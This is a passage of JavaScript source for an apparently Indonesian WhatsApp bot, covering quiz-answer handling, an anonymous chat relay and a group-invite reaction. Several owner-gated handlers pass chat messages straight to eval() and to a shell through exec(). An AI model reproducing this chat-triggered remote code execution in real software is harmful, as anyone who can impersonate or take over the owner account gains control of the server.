                                await zuu.sendText(m.chat, '*`[ Learn - Math ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);
                                userdb.kuismath = false
                                userdb.bits += 143
                                delete kuismath[m.sender.split('@')[0]]
                            } else {
                                if (similarity(m.text, userdb.jawaban) >= threshold) return reply("*Hampir benar. . .*")
                                reply('*Jawaban Salah!*')
                            }
                        } else if (userdb.caklontong === true) {
                            if (m.text.toLowerCase() == "nyerah") {
                                userdb.game = false
                                await reply('*Anda Telah menyerah*');
                                userdb.caklontong = false;
                                delete caklontong[m.sender.split('@')[0]]
                                delete caklontong_desk[m.sender.split('@')[0]]
                            } else if (m.text.replace(" ", "") === userdb.jawaban) {
                                userdb.caklontong = false;
                                userdb.bits += 143;
                                userdb.game = false
                                await reply(`Selamat Jawaban Kamu Benar\n\nJawaban: ${m.text}`);
                                delete caklontong[m.sender.split('@')[0]]
                                delete caklontong_desk[m.sender.split('@')[0]]
                            } else {
                                reply("Jawaban Salah 🤦🏽‍♂️");
                            }
                        } else {}
                    }
                }
                
                    let find = Object.values(zuu.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender) && menpes.state === 'CHATTING');
    if (find) {
                    if (budy) {
                      if (prefix) return   
                      if (m.fromMe) return
    const to = find.a === m.sender ? find.b : find.a;
    await zuu.sendMessage(to, {
        text: m.text,
        mentions: [m.sender]
    });
    reactmess("☑")
    }
 }
 
                if (body.startsWith("~")) {
     if (isJadibot) return 
       if (!isCreator) return 
    reply('*execute...*')
    function Return(sul) {
        let sat = JSON.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return bang;
    }
    try {
        (async () => {
            try {
                const result = await eval(`(async () => { return ${text} })()`);
                reply(Return(result));
            } catch (e) {
                reply(util.format(e));
            }
        })();
    } catch (e) {
        reply(util.format(e));
    }
}
                if (budy.startsWith('=>')) {
                if (isJadibot) return 
                    if (!isCreator) return 

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return m.reply(bang)
                    }
                    try {
                       let resun = util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
                       m.reply(resun)
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                if (isJadibot) return 
                    if (!isCreator) return 
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

                if (budy.startsWith('ee')) {
                if (isJadibot) return 
                    if (!isCreator) return 
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

                if (budy.startsWith('$')) {
                if (isJadibot) return 
                    if (!isCreator) return 
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }

                if ((m.mtype === 'groupInviteMessage' || m.text.startsWith('Undangan untuk bergabung') || m.text.startsWith('Invitation to join') || m.text.startsWith('Buka tautan ini')) && !m.isBaileys && !m.isGroup) {
                    await zuu.sendMessage(m.chat, {
                        react: {
                            text: `🤨`,
                            key: m.key,
                        }
                    })
                    let teks = 'group apa itu'
                    m.reply(teks)
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(color(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})